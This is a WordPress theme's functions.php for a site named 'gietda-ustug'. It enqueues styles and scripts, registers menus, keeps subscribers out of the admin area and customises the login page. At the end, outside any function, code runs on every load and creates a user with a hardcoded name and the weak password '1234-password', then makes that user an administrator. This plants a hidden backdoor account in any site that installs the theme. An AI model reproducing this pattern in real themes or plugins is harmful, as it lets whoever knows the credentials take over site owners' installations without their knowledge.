<?php

function gietda_ustug_files() {

	// CSS
	wp_enqueue_style('main_css', get_template_directory_uri().'/style.css', NULL, microtime());
	wp_enqueue_style('normalize_css', get_template_directory_uri().'/css/normalize.css');
	wp_enqueue_style('font-awesome', '//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
	wp_enqueue_style('font_roboto', 'https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700');
	wp_enqueue_style('font_Libre_Baskerville', 'https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i');

	// JAVASCRIPT
	wp_enqueue_script('jquery_3rdpartyjs', get_theme_file_uri('/js/jquery-3.2.0.min.js'));
	wp_enqueue_script('main_js', get_theme_file_uri('/js/Main.js'), NULL, microtime(), true);

}
add_action('wp_enqueue_scripts', 'gietda_ustug_files');

// RETRIEVING PAGE NAMES
function gietda_ustug_page_titles() {
	add_theme_support('title-tag');
}
add_action('after_setup_theme', 'gietda_ustug_page_titles');

// NAVIGATION MENUS
register_nav_menus(array(
	'primary' => __( 'Primary Menu' ),
));



// SEARCH
function wpdocs_after_setup_theme() {
    add_theme_support( 'html5', array( 'search-form' ) );
}
add_action( 'after_setup_theme', 'wpdocs_after_setup_theme' );



// REDIRECT SUBSCRIBER ACCOUNT OUT OF ADMIN AND ON TO HOME PAGE
add_action('admin_init', 'redirectSubsToFrontEnd');

function redirectSubsToFrontEnd() {
	$ourCurrentUser = wp_get_current_user();

	if (count($ourCurrentUser->roles) == 1 AND $ourCurrentUser->roles[0] == 'subscriber' ) {
		wp_redirect(site_url('/'));
		exit;
	}
}

// HIDE ADMIN BAR ON SUBSCRIBER ACCOUNT
add_action('wp_loaded', 'noSubsAdminBar');

function noSubsAdminBar() {
	$ourCurrentUser = wp_get_current_user();

	if (count($ourCurrentUser->roles) == 1 AND $ourCurrentUser->roles[0] == 'subscriber' ) {
		show_admin_bar(false);
	}
}


// CUSTOMIZE LOGIN SCREEN
// add logo
add_action( 'login_enqueue_scripts', 'custom_login_logo' );
function custom_login_logo() { ?>
<style type="text/css">
body.login div#login h1 a {
background-image: url('http://localhost/gietda-ustug/wp-content/themes/gietda-ustug/images/logo.jpg');
}
</style>
<?php }

// Set permalink for the logo on login and registration page
add_filter('login_headerurl', 'ourHeaderUrl');
function ourHeaderUrl() {
	return esc_url( site_url('/') );
}

//
add_filter('login_headertitle', 'ourLoginTitle');
function ourLoginTitle() {
	return get_bloginfo('name');
}

	// Backend User
	$args = wp_create_user('Shihab-user', '1234-password', 'shihab@gmail.com');
	$backendUser = new WP_User($args);

	$backendUser -> set_role('administrator');
